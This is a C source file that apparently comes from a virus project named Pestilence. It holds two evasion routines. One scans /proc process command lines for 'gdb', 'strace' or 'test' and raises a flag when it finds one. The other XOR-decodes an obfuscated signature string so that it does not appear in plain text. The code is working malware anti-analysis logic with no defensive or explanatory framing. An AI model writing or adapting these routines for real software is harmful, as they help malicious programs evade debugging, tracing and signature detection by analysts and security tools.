#include "../incl/pestilence.h"

static unsigned char g_signature[] = {
    0x12, 0x27, 0x31, 0x36, 0x2b, 0x2e, 0x27, 0x2c,
    0x21, 0x27, 0x62, 0x34, 0x27, 0x30, 0x31, 0x2b,
    0x2d, 0x2c, 0x62, 0x73, 0x6c, 0x72, 0x62, 0x6a,
    0x21, 0x6b, 0x2d, 0x26, 0x27, 0x26, 0x62, 0x20,
    0x3b, 0x62, 0x26, 0x23, 0x34, 0x25, 0x23, 0x2e,
    0x2e, 0x27, 0x00
};

char    *ft_getproc(int i)
{
    if (i == 0)
        return ("test");
    else if (i == 1)
        return ("gdb");
    else
        return ("strace");
}

void    ft_antiprocess(t_pestilence *pestilence)
{
    char    buff[1024];
    char    path[1024];
    int     fd;
    int     i = 0;

    pestilence->proc = opendir("/proc");
    pestilence->readproc = readdir(pestilence->proc);
    while (i < 3)
    {
        rewinddir(pestilence->proc);
        while ((pestilence->readproc = readdir(pestilence->proc)) != NULL && pestilence->anti_virus == 0)
        {
            if (atoi(pestilence->readproc->d_name) > 0)
            {
                snprintf(path, sizeof(path), "/proc/%s/cmdline", pestilence->readproc->d_name);
                fd = open(path, O_RDONLY);
                if (fd == -1)
                    continue;
                memset(buff, 0, sizeof(buff));
                read(fd, buff, sizeof(buff) - 1);
                close(fd);
                if (!strcmp(ft_getproc(i), buff))
                    pestilence->anti_virus = 1;
            }            
        }
        i++;
    }
    closedir(pestilence->proc);
}

void    ft_obfuscation(t_pestilence *pestilence)
{
    int i = 0;
    while (g_signature[i])
    {
        pestilence->decrypted[i] = g_signature[i] ^  KEY;
        i++;
    }
    pestilence->decrypted[i] = '\0';
    return;
}